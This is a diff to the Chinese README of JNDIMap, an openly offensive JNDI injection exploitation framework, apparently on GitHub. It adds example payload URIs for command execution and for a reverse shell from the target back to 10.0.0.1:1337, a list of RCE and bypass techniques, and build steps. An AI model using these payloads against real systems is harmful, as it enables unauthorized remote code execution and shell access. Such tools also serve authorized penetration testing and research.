@@ -25,9 +25,14 @@ JNDIMap 是一个强大的 JNDI 注入利用框架, 支持 RMI、LDAP 和 LDAPS 
 java -jar JNDIMap-version.jar -i 10.0.0.1
 ```
 
-📖 [使用指南](USAGE.md)
+在目标机器上执行命令或反弹 Shell
 
-## 📦 功能特性
+```bash
+rmi://10.0.0.1:1099/Basic/Command/open -a Calculator
+ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
+```
+
+## 🚩 功能特性
 
 - DNS Log
 - 命令执行
@@ -41,16 +46,34 @@ java -jar JNDIMap-version.jar -i 10.0.0.1
 - LDAP(s) 反序列化
 - 自定义 JNDI Payload (基于 Nashorn JS 引擎)
 
+## 📖 使用指南
+
+> 完整文档: [USAGE.md](USAGE.md)
+
+- [Usage](USAGE.md#usage)
+- [Basic](USAGE.md#basic)
+- [Bypass](USAGE.md#bypass)
+- [MLet](USAGE.md#mlet)
+- [NativeLibLoader](USAGE.md#nativelibloader)
+- [JDBC RCE](USAGE.md#jdbc-rce)
+  - [MySQL](USAGE.md#mysql)
+  - [PostgreSQL](USAGE.md#postgresql)
+  - [H2](USAGE.md#h2)
+  - [Derby](USAGE.md#derby)
+- [Deserialize](USAGE.md#deserialize)
+- [Script](USAGE.md#script)
+- [useReferenceOnly](USAGE.md#usereferenceonly)
+
 ## ⚙️ 编译
 
-基于 JDK 8
+[Releases](https://github.com/X1r0z/JNDIMap/releases) 的版本可能存在滞后, 推荐在使用时拉取源码自行编译 (基于 JDK 8)
 
 ```bash
 git clone https://github.com/X1r0z/JNDIMap && cd JNDIMap
 mvn package -Dmaven.test.skip=true
 ```
 
-## 📚 参考
+## 📷 参考 & 致谢
 
 [https://tttang.com/archive/1405/](https://tttang.com/archive/1405/)
 
